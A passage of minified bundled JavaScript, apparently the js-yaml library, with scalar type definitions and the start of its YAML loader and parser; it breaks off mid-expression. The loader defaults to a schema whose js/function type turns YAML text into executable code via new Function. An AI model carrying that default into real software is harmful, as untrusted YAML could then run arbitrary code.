f===1&&d==="~"||f===4&&(d==="null"||d==="Null"||d==="NULL")}function s(){return null}function c(d){return d===null}return _null=new o("tag:yaml.org,2002:null",{kind:"scalar",resolve:i,construct:s,predicate:c,represent:{canonical:function(){return"~"},lowercase:function(){return"null"},uppercase:function(){return"NULL"},camelcase:function(){return"Null"}},defaultStyle:"lowercase"}),_null}var bool,hasRequiredBool;function requireBool(){if(hasRequiredBool)return bool;hasRequiredBool=1;var o=requireType();function i(d){if(d===null)return!1;var f=d.length;return f===4&&(d==="true"||d==="True"||d==="TRUE")||f===5&&(d==="false"||d==="False"||d==="FALSE")}function s(d){return d==="true"||d==="True"||d==="TRUE"}function c(d){return Object.prototype.toString.call(d)==="[object Boolean]"}return bool=new o("tag:yaml.org,2002:bool",{kind:"scalar",resolve:i,construct:s,predicate:c,represent:{lowercase:function(d){return d?"true":"false"},uppercase:function(d){return d?"TRUE":"FALSE"},camelcase:function(d){return d?"True":"False"}},defaultStyle:"lowercase"}),bool}var int,hasRequiredInt;function requireInt(){if(hasRequiredInt)return int;hasRequiredInt=1;var o=requireCommon(),i=requireType();function s(m){return 48<=m&&m<=57||65<=m&&m<=70||97<=m&&m<=102}function c(m){return 48<=m&&m<=55}function d(m){return 48<=m&&m<=57}function f(m){if(m===null)return!1;var v=m.length,b=0,x=!1,P;if(!v)return!1;if(P=m[b],(P==="-"||P==="+")&&(P=m[++b]),P==="0"){if(b+1===v)return!0;if(P=m[++b],P==="b"){for(b++;b<v;b++)if(P=m[b],P!=="_"){if(P!=="0"&&P!=="1")return!1;x=!0}return x&&P!=="_"}if(P==="x"){for(b++;b<v;b++)if(P=m[b],P!=="_"){if(!s(m.charCodeAt(b)))return!1;x=!0}return x&&P!=="_"}for(;b<v;b++)if(P=m[b],P!=="_"){if(!c(m.charCodeAt(b)))return!1;x=!0}return x&&P!=="_"}if(P==="_")return!1;for(;b<v;b++)if(P=m[b],P!=="_"){if(P===":")break;if(!d(m.charCodeAt(b)))return!1;x=!0}return!x||P==="_"?!1:P!==":"?!0:/^(:[0-5]?[0-9])+$/.test(m.slice(b))}function h(m){var v=m,b=1,x,P,E=[];return v.indexOf("_")!==-1&&(v=v.replace(/_/g,"")),x=v[0],(x==="-"||x==="+")&&(x==="-"&&(b=-1),v=v.slice(1),x=v[0]),v==="0"?0:x==="0"?v[1]==="b"?b*parseInt(v.slice(2),2):v[1]==="x"?b*parseInt(v,16):b*parseInt(v,8):v.indexOf(":")!==-1?(v.split(":").forEach(function(w){E.unshift(parseInt(w,10))}),v=0,P=1,E.forEach(function(w){v+=w*P,P*=60}),b*v):b*parseInt(v,10)}function u(m){return Object.prototype.toString.call(m)==="[object Number]"&&m%1===0&&!o.isNegativeZero(m)}return int=new i("tag:yaml.org,2002:int",{kind:"scalar",resolve:f,construct:h,predicate:u,represent:{binary:function(m){return m>=0?"0b"+m.toString(2):"-0b"+m.toString(2).slice(1)},octal:function(m){return m>=0?"0"+m.toString(8):"-0"+m.toString(8).slice(1)},decimal:function(m){return m.toString(10)},hexadecimal:function(m){return m>=0?"0x"+m.toString(16).toUpperCase():"-0x"+m.toString(16).toUpperCase().slice(1)}},defaultStyle:"decimal",styleAliases:{binary:[2,"bin"],octal:[8,"oct"],decimal:[10,"dec"],hexadecimal:[16,"hex"]}}),int}var float,hasRequiredFloat;function requireFloat(){if(hasRequiredFloat)return float;hasRequiredFloat=1;var o=requireCommon(),i=requireType(),s=new RegExp("^(?:[-+]?(?:0|[1-9][0-9_]*)(?:\\.[0-9_]*)?(?:[eE][-+]?[0-9]+)?|\\.[0-9_]+(?:[eE][-+]?[0-9]+)?|[-+]?[0-9][0-9_]*(?::[0-5]?[0-9])+\\.[0-9_]*|[-+]?\\.(?:inf|Inf|INF)|\\.(?:nan|NaN|NAN))$");function c(m){return!(m===null||!s.test(m)||m[m.length-1]==="_")}function d(m){var v,b,x,P;return v=m.replace(/_/g,"").toLowerCase(),b=v[0]==="-"?-1:1,P=[],"+-".indexOf(v[0])>=0&&(v=v.slice(1)),v===".inf"?b===1?Number.POSITIVE_INFINITY:Number.NEGATIVE_INFINITY:v===".nan"?NaN:v.indexOf(":")>=0?(v.split(":").forEach(function(E){P.unshift(parseFloat(E,10))}),v=0,x=1,P.forEach(function(E){v+=E*x,x*=60}),b*v):b*parseFloat(v,10)}var f=/^[-+]?[0-9]+e/;function h(m,v){var b;if(isNaN(m))switch(v){case"lowercase":return".nan";case"uppercase":return".NAN";case"camelcase":return".NaN"}else if(Number.POSITIVE_INFINITY===m)switch(v){case"lowercase":return".inf";case"uppercase":return".INF";case"camelcase":return".Inf"}else if(Number.NEGATIVE_INFINITY===m)switch(v){case"lowercase":return"-.inf";case"uppercase":return"-.INF";case"camelcase":return"-.Inf"}else if(o.isNegativeZero(m))return"-0.0";return b=m.toString(10),f.test(b)?b.replace("e",".e"):b}function u(m){return Object.prototype.toString.call(m)==="[object Number]"&&(m%1!==0||o.isNegativeZero(m))}return float=new i("tag:yaml.org,2002:float",{kind:"scalar",resolve:c,construct:d,predicate:u,represent:h,defaultStyle:"lowercase"}),float}var json,hasRequiredJson;function requireJson(){if(hasRequiredJson)return json;hasRequiredJson=1;var o=requireSchema();return json=new o({include:[requireFailsafe()],implicit:[require_null(),requireBool(),requireInt(),requireFloat()]}),json}var core,hasRequiredCore;function requireCore(){if(hasRequiredCore)return core;hasRequiredCore=1;var o=requireSchema();return core=new o({include:[requireJson()]}),core}var timestamp,hasRequiredTimestamp;function requireTimestamp(){if(hasRequiredTimestamp)return timestamp;hasRequiredTimestamp=1;var o=requireType(),i=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9])-([0-9][0-9])$"),s=new RegExp("^([0-9][0-9][0-9][0-9])-([0-9][0-9]?)-([0-9][0-9]?)(?:[Tt]|[ \\t]+)([0-9][0-9]?):([0-9][0-9]):([0-9][0-9])(?:\\.([0-9]*))?(?:[ \\t]*(Z|([-+])([0-9][0-9]?)(?::([0-9][0-9]))?))?$");function c(h){return h===null?!1:i.exec(h)!==null||s.exec(h)!==null}function d(h){var u,m,v,b,x,P,E,w=0,T=null,j,k,I;if(u=i.exec(h),u===null&&(u=s.exec(h)),u===null)throw new Error("Date resolve error");if(m=+u[1],v=+u[2]-1,b=+u[3],!u[4])return new Date(Date.UTC(m,v,b));if(x=+u[4],P=+u[5],E=+u[6],u[7]){for(w=u[7].slice(0,3);w.length<3;)w+="0";w=+w}return u[9]&&(j=+u[10],k=+(u[11]||0),T=(j*60+k)*6e4,u[9]==="-"&&(T=-T)),I=new Date(Date.UTC(m,v,b,x,P,E,w)),T&&I.setTime(I.getTime()-T),I}function f(h){return h.toISOString()}return timestamp=new o("tag:yaml.org,2002:timestamp",{kind:"scalar",resolve:c,construct:d,instanceOf:Date,represent:f}),timestamp}var merge,hasRequiredMerge;function requireMerge(){if(hasRequiredMerge)return merge;hasRequiredMerge=1;var o=requireType();function i(s){return s==="<<"||s===null}return merge=new o("tag:yaml.org,2002:merge",{kind:"scalar",resolve:i}),merge}function commonjsRequire(o){throw new Error('Could not dynamically require "'+o+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var binary,hasRequiredBinary;function requireBinary(){if(hasRequiredBinary)return binary;hasRequiredBinary=1;var o;try{var i=commonjsRequire;o=i("buffer").Buffer}catch{}var s=requireType(),c=`ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
\r`;function d(m){if(m===null)return!1;var v,b,x=0,P=m.length,E=c;for(b=0;b<P;b++)if(v=E.indexOf(m.charAt(b)),!(v>64)){if(v<0)return!1;x+=6}return x%8===0}function f(m){var v,b,x=m.replace(/[\r\n=]/g,""),P=x.length,E=c,w=0,T=[];for(v=0;v<P;v++)v%4===0&&v&&(T.push(w>>16&255),T.push(w>>8&255),T.push(w&255)),w=w<<6|E.indexOf(x.charAt(v));return b=P%4*6,b===0?(T.push(w>>16&255),T.push(w>>8&255),T.push(w&255)):b===18?(T.push(w>>10&255),T.push(w>>2&255)):b===12&&T.push(w>>4&255),o?o.from?o.from(T):new o(T):T}function h(m){var v="",b=0,x,P,E=m.length,w=c;for(x=0;x<E;x++)x%3===0&&x&&(v+=w[b>>18&63],v+=w[b>>12&63],v+=w[b>>6&63],v+=w[b&63]),b=(b<<8)+m[x];return P=E%3,P===0?(v+=w[b>>18&63],v+=w[b>>12&63],v+=w[b>>6&63],v+=w[b&63]):P===2?(v+=w[b>>10&63],v+=w[b>>4&63],v+=w[b<<2&63],v+=w[64]):P===1&&(v+=w[b>>2&63],v+=w[b<<4&63],v+=w[64],v+=w[64]),v}function u(m){return o&&o.isBuffer(m)}return binary=new s("tag:yaml.org,2002:binary",{kind:"scalar",resolve:d,construct:f,predicate:u,represent:h}),binary}var omap,hasRequiredOmap;function requireOmap(){if(hasRequiredOmap)return omap;hasRequiredOmap=1;var o=requireType(),i=Object.prototype.hasOwnProperty,s=Object.prototype.toString;function c(f){if(f===null)return!0;var h=[],u,m,v,b,x,P=f;for(u=0,m=P.length;u<m;u+=1){if(v=P[u],x=!1,s.call(v)!=="[object Object]")return!1;for(b in v)if(i.call(v,b))if(!x)x=!0;else return!1;if(!x)return!1;if(h.indexOf(b)===-1)h.push(b);else return!1}return!0}function d(f){return f!==null?f:[]}return omap=new o("tag:yaml.org,2002:omap",{kind:"sequence",resolve:c,construct:d}),omap}var pairs,hasRequiredPairs;function requirePairs(){if(hasRequiredPairs)return pairs;hasRequiredPairs=1;var o=requireType(),i=Object.prototype.toString;function s(d){if(d===null)return!0;var f,h,u,m,v,b=d;for(v=new Array(b.length),f=0,h=b.length;f<h;f+=1){if(u=b[f],i.call(u)!=="[object Object]"||(m=Object.keys(u),m.length!==1))return!1;v[f]=[m[0],u[m[0]]]}return!0}function c(d){if(d===null)return[];var f,h,u,m,v,b=d;for(v=new Array(b.length),f=0,h=b.length;f<h;f+=1)u=b[f],m=Object.keys(u),v[f]=[m[0],u[m[0]]];return v}return pairs=new o("tag:yaml.org,2002:pairs",{kind:"sequence",resolve:s,construct:c}),pairs}var set,hasRequiredSet;function requireSet(){if(hasRequiredSet)return set;hasRequiredSet=1;var o=requireType(),i=Object.prototype.hasOwnProperty;function s(d){if(d===null)return!0;var f,h=d;for(f in h)if(i.call(h,f)&&h[f]!==null)return!1;return!0}function c(d){return d!==null?d:{}}return set=new o("tag:yaml.org,2002:set",{kind:"mapping",resolve:s,construct:c}),set}var default_safe,hasRequiredDefault_safe;function requireDefault_safe(){if(hasRequiredDefault_safe)return default_safe;hasRequiredDefault_safe=1;var o=requireSchema();return default_safe=new o({include:[requireCore()],implicit:[requireTimestamp(),requireMerge()],explicit:[requireBinary(),requireOmap(),requirePairs(),requireSet()]}),default_safe}var _undefined,hasRequired_undefined;function require_undefined(){if(hasRequired_undefined)return _undefined;hasRequired_undefined=1;var o=requireType();function i(){return!0}function s(){}function c(){return""}function d(f){return typeof f>"u"}return _undefined=new o("tag:yaml.org,2002:js/undefined",{kind:"scalar",resolve:i,construct:s,predicate:d,represent:c}),_undefined}var regexp,hasRequiredRegexp;function requireRegexp(){if(hasRequiredRegexp)return regexp;hasRequiredRegexp=1;var o=requireType();function i(f){if(f===null||f.length===0)return!1;var h=f,u=/\/([gim]*)$/.exec(f),m="";return!(h[0]==="/"&&(u&&(m=u[1]),m.length>3||h[h.length-m.length-1]!=="/"))}function s(f){var h=f,u=/\/([gim]*)$/.exec(f),m="";return h[0]==="/"&&(u&&(m=u[1]),h=h.slice(1,h.length-m.length-1)),new RegExp(h,m)}function c(f){var h="/"+f.source+"/";return f.global&&(h+="g"),f.multiline&&(h+="m"),f.ignoreCase&&(h+="i"),h}function d(f){return Object.prototype.toString.call(f)==="[object RegExp]"}return regexp=new o("tag:yaml.org,2002:js/regexp",{kind:"scalar",resolve:i,construct:s,predicate:d,represent:c}),regexp}var _function,hasRequired_function;function require_function(){if(hasRequired_function)return _function;hasRequired_function=1;var o;try{var i=commonjsRequire;o=i("esprima")}catch{typeof window<"u"&&(o=window.esprima)}var s=requireType();function c(u){if(u===null)return!1;try{var m="("+u+")",v=o.parse(m,{range:!0});return!(v.type!=="Program"||v.body.length!==1||v.body[0].type!=="ExpressionStatement"||v.body[0].expression.type!=="ArrowFunctionExpression"&&v.body[0].expression.type!=="FunctionExpression")}catch{return!1}}function d(u){var m="("+u+")",v=o.parse(m,{range:!0}),b=[],x;if(v.type!=="Program"||v.body.length!==1||v.body[0].type!=="ExpressionStatement"||v.body[0].expression.type!=="ArrowFunctionExpression"&&v.body[0].expression.type!=="FunctionExpression")throw new Error("Failed to resolve function");return v.body[0].expression.params.forEach(function(P){b.push(P.name)}),x=v.body[0].expression.body.range,v.body[0].expression.body.type==="BlockStatement"?new Function(b,m.slice(x[0]+1,x[1]-1)):new Function(b,"return "+m.slice(x[0],x[1]))}function f(u){return u.toString()}function h(u){return Object.prototype.toString.call(u)==="[object Function]"}return _function=new s("tag:yaml.org,2002:js/function",{kind:"scalar",resolve:c,construct:d,predicate:h,represent:f}),_function}var default_full,hasRequiredDefault_full;function requireDefault_full(){if(hasRequiredDefault_full)return default_full;hasRequiredDefault_full=1;var o=requireSchema();return default_full=o.DEFAULT=new o({include:[requireDefault_safe()],explicit:[require_undefined(),requireRegexp(),require_function()]}),default_full}var hasRequiredLoader;function requireLoader(){if(hasRequiredLoader)return loader;hasRequiredLoader=1;var o=requireCommon(),i=requireException(),s=requireMark(),c=requireDefault_safe(),d=requireDefault_full(),f=Object.prototype.hasOwnProperty,h=1,u=2,m=3,v=4,b=1,x=2,P=3,E=/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F-\x84\x86-\x9F\uFFFE\uFFFF]|[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:[^\uD800-\uDBFF]|^)[\uDC00-\uDFFF]/,w=/[\x85\u2028\u2029]/,T=/[,\[\]\{\}]/,j=/^(?:!|!!|![a-z\-]+!)$/i,k=/^(?:!|[^,\[\]\{\}])(?:%[0-9a-f]{2}|[0-9a-z\-#;\/\?:@&=\+\$,_\.!~\*'\(\)\[\]])*$/i;function I(r){return Object.prototype.toString.call(r)}function N(r){return r===10||r===13}function B(r){return r===9||r===32}function D(r){return r===9||r===32||r===10||r===13}function O(r){return r===44||r===91||r===93||r===123||r===125}function L(r){var S;return 48<=r&&r<=57?r-48:(S=r|32,97<=S&&S<=102?S-97+10:-1)}function z(r){return r===120?2:r===117?4:r===85?8:0}function Y(r){return 48<=r&&r<=57?r-48:-1}function ae(r){return r===48?"\0":r===97?"\x07":r===98?"\b":r===116||r===9?"	":r===110?`
`:r===118?"\v":r===102?"\f":r===114?"\r":r===101?"\x1B":r===32?" ":r===34?'"':r===47?"/":r===92?"\\":r===78?"":r===95?" ":r===76?"\u2028":r===80?"\u2029":""}function ie(r){return r<=65535?String.fromCharCode(r):String.fromCharCode((r-65536>>10)+55296,(r-65536&1023)+56320)}function fe(r,S,t){S==="__proto__"?Object.defineProperty(r,S,{configurable:!0,enumerable:!0,writable:!0,value:t}):r[S]=t}for(var te=new Array(256),Q=new Array(256),Z=0;Z<256;Z++)te[Z]=ae(Z)?1:0,Q[Z]=ae(Z);function Pe(r,S){this.input=r,this.filename=S.filename||null,this.schema=S.schema||d,this.onWarning=S.onWarning||null,this.legacy=S.legacy||!1,this.json=S.json||!1,this.listener=S.listener||null,this.maxTotalMergeKeys=typeof S.maxTotalMergeKeys=="number"?S.maxTotalMergeKeys:1e4,this.implicitTypes=this.schema.compiledImplicit,this.typeMap=this.schema.compiledTypeMap,this.length=r.length,this.position=0,this.line=0,this.lineStart=0,this.lineIndent=0,this.totalMergeKeys=0,this.documents=[]}function be(r,S){return new i(S,new s(r.filename,r.input,r.position,r.line,r.position-r.lineStart))}function F(r,S){throw be(r,S)}function oe(r,S){r.onWarning&&r.onWarning.call(null,be(r,S))}var pe={YAML:function(S,t,e){var n,a,l;S.version!==null&&F(S,"duplication of %YAML directive"),e.length!==1&&F(S,"YAML directive accepts exactly one argument"),n=/^([0-9]+)\.([0-9]+)$/.exec(e[0]),n===null&&F(S,"ill-formed argument of the YAML directive"),a=parseInt(n[1],10),l=parseInt(n[2],10),a!==1&&F(S,"unacceptable YAML version of the document"),S.version=e[0],S.checkLineBreaks=l<2,l!==1&&l!==2&&oe(S,"unsupported YAML version of the document")},TAG:function(S,t,e){var n,a;e.length!==2&&F(S,"TAG directive accepts exactly two arguments"),n=e[0],a=e[1],j.test(n)||F(S,"ill-formed tag handle (first argument) of the TAG directive"),f.call(S.tagMap,n)&&F(S,'there is a previously declared suffix for "'+n+'" tag handle'),k.test(a)||F(S,"ill-formed tag prefix (second argument) of the TAG directive"),S.tagMap[n]=a}};function W(r,S,t,e){var n,a,l,p;if(S<t){if(p=r.input.slice(S,t),e)for(n=0,a=p.length;n<a;n+=1)l=p.charCodeAt(n),l===9||32<=l&&l<=1114111||F(r,"expected valid JSON character");else E.test(p)&&F(r,"the stream contains non-printable characters");r.result+=p}}function K(r,S,t,e){var n,a,l,p;for(o.isObject(t)||F(r,"cannot merge mappings; the provided source object is unacceptable"),n=Object.keys(t),l=0,p=n.length;l<p;l+=1)a=n[l],r.maxTotalMergeKeys!==-1&&++r.totalMergeKeys>r.maxTotalMergeKeys&&F(r,"merge keys exceeded maxTotalMergeKeys ("+r.maxTotalMergeKeys+")"),f.call(S,a)||(fe(S,a,t[a]),e[a]=!0)}function J(r,S,t,e,n,a,l,p){var y,A;if(Array.isArray(n))for(n=Array.prototype.slice.call(n),y=0,A=n.length;y<A;y+=1)Array.isArray(n[y])&&F(r,"nested arrays are not supported inside keys"),typeof n=="object"&&I(n[y])==="[object Object]"&&(n[y]="[object Object]");if(typeof n=="object"&&I(n)==="[object Object]"&&(n="[object Object]"),n=String(n),S===null&&(S={}),e==="tag:yaml.org,2002:merge")if(Array.isArray(a))for(y=0,A=a.length;y<A;y+=1)K(r,S,a[y],t);else K(r,S,a,t);else!r.json&&!f.call(t,n)&&f.call(S,n)&&(r.line=l||r.line,r.position=p||r.position,F(r,"duplicated mapping key")),fe(S,n,a),delete t[n];return S}function me(r){var S;S=r.input.charCodeAt(r.position),S===10?r.position++:S===13?(r.position++,r.input.charCodeAt(r.position)===10&&r.position++):F(r,"a line break is expected"),r.line+=1,r.lineStart=r.position}function V(r,S,t){for(var e=0,n=r.input.charCodeAt(r.position);n!==0;){for(;B(n);)n=r.input.charCodeAt(++r.position);if(S&&n===35)do n=r.input.charCodeAt(++r.position);while(n!==10&&n!==13&&n!==0);if(N(n))for(me(r),n=r.input.charCodeAt(r.position),e++,r.lineIndent=0;n===32;)r.lineIndent++,n=r.input.charCodeAt(++r.position);else break}return t!==-1&&e!==0&&r.lineIndent<t&&oe(r,"deficient indentation"),e}function se(r){var S=r.position,t;return t=r.input.charCodeAt(S),!!((t===45||t===46)&&t===r.input.charCodeAt(S+1)&&t===r.input.charCodeAt(S+2)&&(S+=3,t=r.input.charCodeAt(S),t===0||D(t)))}function ce(r,S){S===1?r.result+=" ":S>1&&(r.result+=o.repeat(`
`,S-1))}function ee(r,S,t){var e,n,a,l,p,y,A,q,C=r.kind,_=r.result,R;if(R=r.input.charCodeAt(r.position),D(R)||O(R)||R===35||R===38||R===42||R===33||R===124||R===62||R===39||R===34||R===37||R===64||R===96||(R===63||R===45)&&(n=r.input.charCodeAt(r.position+1),D(n)||t&&O(n)))return!1;for(r.kind="scalar",r.result="",a=l=r.position,p=!1;R!==0;){if(R===58){if(n=r.input.charCodeAt(r.position+1),D(n)||t&&O(n))break}else if(R===35){if(e=r.input.charCodeAt(r.position-1),D(e))break}else{if(r.position===r.lineStart&&se(r)||t&&O(R))break;if(N(R))if(y=r.line,A=r.lineStart,q=r.lineIndent,V(r,!1,-1),r.lineIndent>=S){p=!0,R=r.input.charCodeAt(r.position);continue}else{r.position=l,r.line=y,r.lineStart=A,r.lineIndent=q;break}}p&&(W(r,a,l,!1),ce(r,r.line-y),a=l=r.position,p=!1),B(R)||(l=r.position+1),R=r.input.charCodeAt(++r.position)}return W(r,a,l,!1),r.result?!0:(r.kind=C,r.result=_,!1)}function he(r,S){var t,e,n;if(t=r.input.charCodeAt(r.position),t!==39)return!1;for(r.kind="scalar",r.result="",r.position++,e=n=r.position;(t=r.input.charCodeAt(r.position))!==0;)if(t===39)if(W(r,e,r.position,!0),t=r.input.charCodeAt(++r.position),t===39)e=r.position,r.position++,n=r.position;else return!0;else N(t)?(W(r,e,n,!0),ce(r,V(r,!1,S)),e=n=r.position):r.position===r.lineStart&&se(r)?F(r,"unexpected end of the document within a single quoted scalar"):(r.position++,n=r.position);F(r,"unexpected end of the stream within a single quoted scalar")}function ge(r,S){var t,e,n,a,l,p;if(p=r.input.charCodeAt(r.position),p!==34)return!1;for(r.kind="scalar",r.result="",r.position++,t=e=r.position;(p=r.input.charCodeAt(r.position))!==0;){if(p===34)return W(r,t,r.position,!0),r.position++,!0;if(p===92){if(W(r,t,r.position,!0),p=r.input.charCodeAt(++r.position),N(p))V(r,!1,S);else if(p<256&&te[p])r.result+=Q[p],r.position++;else if((l=z(p))>0){for(n=l,a=0;n>0;n--)p=r.input.charCodeAt(++r.position),(l=L(p))>=0?a=(a<<4)+l:F(r,"expected hexadecimal character");r.result+=ie(a),r.position++}else F(r,"unknown escape sequence");t=e=r.position}else N(p)?(W(r,t,e,!0),ce(r,V(r,!1,S)),t=e=r.position):r.position===r.lineStart&&se(r)?F(r,"unexpected end of the document within a double quoted scalar"):(r.position++,e=r.position)}F(r,"unexpected end of the stream within a double quoted scalar")}function Ee(r,S){var t=!0,e,n=r.tag,a,l=r.anchor,p,y,A,q,C,_={},R,M,U,H;if(H=r.input.charCodeAt(r.position),H===91)y=93,C=!1,a=[];else if(H===123)y=125,C=!0,a={};else return!1;for(r.anchor!==null&&(r.anchorMap[r.anchor]=a),H=r.input.charCodeAt(++r.position);H!==0;){if(V(r,!0,S),H=r.input.charCodeAt(r.position),H===y)return r.position++,r.tag=n,r.anchor=l,r.kind=C?"mapping":"sequence",r.result=a,!0;t||F(r,"missed comma between flow collection entries"),M=R=U=null,A=q=!1,H===63&&(p=r.input.charCodeAt(r.position+1),D(p)&&(A=q=!0,r.position++,V(r,!0,S))),e=r.line,ne(r,S,h,!1,!0),M=r.tag,R=r.result,V(r,!0,S),H=r.input.charCodeAt(r.position),(q||r.line===e)&&H===58&&(A=!0,H=r.input.charCodeAt(++r.position),V(r,!0,S),ne(r,S,h,!1,!0),U=r.result),C?J(r,a,_,M,R,U):A?a.push(J(r,null,_,M,R,U)):a.push(R),V(r,!0,S),H=r.input.charCodeAt(r.position),H===44?(t=!0,H=r.input.charCodeAt(++r.position)):t=!1}F(r,"unexpected end of the stream within a flow collection")}function le(r,S){var t,e,n=b,a=!1,l=!1,p=S,y=0,A=!1,q,C;if(C=r.input.charCodeAt(r.position),C===124)e=!1;else if(C===62)e=!0;else return!1;for(r.kind="scalar",r.result="";C!==0;)if(C=r.input.charCodeAt(++r.position),C===43||C===45)b===n?n=C===43?P:x:F(r,"repeat of a chomping mode identifier");else if((q=Y(C))>=0)q===0?F(r,"bad explicit indentation width of a block scalar; it cannot be less than one"):l?F(r,"repeat of an indentation width identifier"):(p=S+q-1,l=!0);else break;if(B(C)){do C=r.input.charCodeAt(++r.position);while(B(C));if(C===35)do C=r.input.charCodeAt(++r.position);while(!N(C)&&C!==0)}for(;C!==0;){for(me(r),r.lineIndent=0,C=r.input.charCodeAt(r.position);(!l||r.lineIndent<p)&&C===32;)r.lineIndent++,C=r.input.charCodeAt(++r.position);if(!l&&r.lineIndent>p&&(p=r.lineIndent),N(C)){y++;continue}if(r.lineIndent<p){n===P?r.result+=o.repeat(`
`,a?1+y:y):n===b&&a&&(r.result+=`
`);break}for(e?B(C)?(A=!0,r.result+=o.repeat(`
`,a?1+y:y)):A?(A=!1,r.result+=o.repeat(`
`,y+1)):y===0?a&&(r.result+=" "):r.result+=o.repeat(`
`,y):r.result+=o.repeat(`
`,a?1+y:y),a=!0,l=!0,y=0,t=r.position;!N(C)&&C!==0;)C=r.input.charCodeAt(++r.position);W(r,t,r.position,!1)}return!0}function re(r,S){var t,e=r.tag,n=r.anchor,a=[],l,p=!1,y;for(r.anchor!==null&&(r.anchorMap[r.anchor]=a),y=r.input.charCodeAt(r.position);y!==0&&!(y!==45||(l=r.input.charCodeAt(r.position+1),!D(l)));){if(p=!0,r.position++,V(r,!0,-1)&&r.lineIndent<=S){a.push(null),y=r.input.charCodeAt(r.position);continue}if(t=r.line,ne(r,S,m,!1,!0),a.push(r.result),V(r,!0,-1),y=r.input.charCodeAt(r.position),(r.line===t||r.lineIndent>S)&&y!==0)F(r,"bad indentation of a sequence entry");else if(r.lineIndent<S)break}return p?(r.tag=e,r.anchor=n,r.kind="sequence",r.result=a,!0):!1}function ue(r,S,t){var e,n,a,l,p=r.tag,y=r.anchor,A={},q={},C=null,_=null,R=null,M=!1,U=!1,H;for(r.anchor!==null&&(r.anchorMap[r.anchor]=A),H=r.input.charCodeAt(r.position);H!==0;){if(e=r.input.charCodeAt(r.position+1),a=r.line,l=r.position,(H===63||H===58)&&D(e))H===63?(M&&(J(r,A,q,C,_,null),C=_=R=null),U=!0,M=!0,n=!0):M?(M=!1,n=!0):F(r,"incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line"),r.position+=1,H=e;else if(ne(r,t,u,!1,!0))if(r.line===a){for(H=r.input.charCodeAt(r.position);B(H);)H=r.input.charCodeAt(++r.position);if(H===58)H=r.input.charCodeAt(++r.position),D(H)||F(r,"a whitespace character is expected after the key-value separator within a block mapping"),M&&(J(r,A,q,C,_,null),C=_=R=null),U=!0,M=!1,n=!1,C=r.tag,_=r.result;else if(U)F(r,"can not read an implicit mapping pair; a colon is missed");else return r.tag=p,r.anchor=y,!0}else if(U)F(r,"can not read a block mapping entry; a multiline key may not be an implicit key");else return r.tag=p,r.anchor=y,!0;else break;if((r.line===a||r.lineIndent>S)&&(ne(r,S,v,!0,n)&&(M?_=r.result:R=r.result),M||(J(r,A,q,C,_,R,a,l),C=_=R=null),V(r,!0,-1),H=r.input.charCodeAt(r.position)),r.lineIndent>S&&H!==0)F(r,"bad indentation of a mapping entry");else if(r.lineIndent<S)break}return M&&J(r,A,q,C,_,null),U&&(r.tag=p,r.anchor=y,r.kind="mapping",r.result=A),U}function Se(r){var S,t=!1,e=!1,n,a,l;if(l=r.input.charCodeAt(r.position),l!==33)return!1;if(r.tag!==null&&F(r,"duplication of a tag property"),l=r.input.charCodeAt(++r.position),l===60?(t=!0,l=r.input.charCodeAt(++r.position)):l===33?(e=!0,n="!!",l=r.input.charCodeAt(++r.position)):n="!",S=r.position,t){do l=r.input.charCodeAt(++r.position);while(l!==0&&l!==62);r.position<r.length?(a=r.input.slice(S,r.position),l=r.input.charCodeAt(++r.position)):F(r,"unexpected end of the stream within a verbatim tag")}else{for(;l!==0&&!D(l);)l===33&&(e?F(r,"tag suffix cannot contain exclamation marks"):(n=r.input.slice(S-1,r.position+1),j.test(n)||F(r,"named tag handle cannot contain such characters"),e=!0,S=r.position+1)),l=r.input.charCodeAt(++r.position);a=r.input.slice(S,r.position),T.test(a)&&F(r,"tag suffix cannot contain flow indicator characters")}return a&&!k.test(a)&&F(r,"tag name cannot contain such characters: "+a),t?r.tag=a:f.call(r.tagMap,n)?r.tag=r.tagMap[n]+a:n==="!"?r.tag="!"+a:n==="!!"?r.tag="tag:yaml.org,2002:"+a:F(r,'undeclared tag handle "'+n+'"'),!0}function we(r){var S,t;if(t=r.input.charCodeAt(r.position),t!==38)return!1;for(r.anchor!==null&&F(r,"duplication of an anchor property"),t=r.input.charCodeAt(++r.position),S=r.position;t!==0&&!D(t)&&!O(t);)t=r.input.charCodeAt(++r.position);return r.position===S&&F(r,"name of an anchor node must contain at least one character"),r.anchor=r.input.slice(S,r.position),!0}function ye(r){var S,t,e;if(e=r.input.charCodeAt(r.position),e!==42)return!1;for(e=r.input.charCodeAt(++r.position),S=r.position;e!==0&&!D(e)&&!O(e);)e=r.input.charCodeAt(++r.position);return r.position===S&&F(r,"name of an alias node must contain at least one character"),t=r.input.slice(S,r.position),f.call(r.anchorMap,t)||F(r,'unidentified alias "'+t+'"'),r.result=r.anchorMap[t],V(r,!0,-1),!0}function ne(r,S,t,e,n){var a,l,p,y=1,A=!1,q=!1,C,_,R,M,U;if(r.listener!==null&&r.listener("open",r),r.tag=null,r.anchor=null,r.kind=null,r.result=null,a=l=p=v===t||m===t,e&&V(r,!0,-1)&&(A=!0,r.lineIndent>S?y=1:r.lineIndent===S?y=0:r.lineIndent<S&&(y=-1)),y===1)for(;Se(r)||we(r);)V(r,!0,-1)?(A=!0,p=a,r.lineIndent>S?y=1:r.lineIndent===S?y=0:r.lineIndent<S&&(y=-1)):p=!1;if(p&&(p=A||n),(y===1||v===t)&&(h===t||u===t?M=S:M=S+1,U=r.position-r.lineStart,y===1?p&&(re(r,U)||ue(r,U,M))||Ee(r,M)?q=!0:(l&&le(r,M)||he(r,M)||ge(r,M)?q=!0:ye(r)?(q=!0,(r.tag!==null||r.anchor!==null)&&F(r,"alias node should not have any properties")):ee(r,M,h===t)&&(q=!0,r.tag===null&&(r.tag="?")),r.anchor!==null&&(r.anchorMap[r.anchor]=r.result)):y===0&&(q=p&&re(r,U))),r.tag!==null&&r.tag!=="!")if(r.tag==="?"){for(r.result!==null&&r.kind!=="scalar"&&F(r,'unacceptable node kind for !<?> tag; it should be "scalar", not 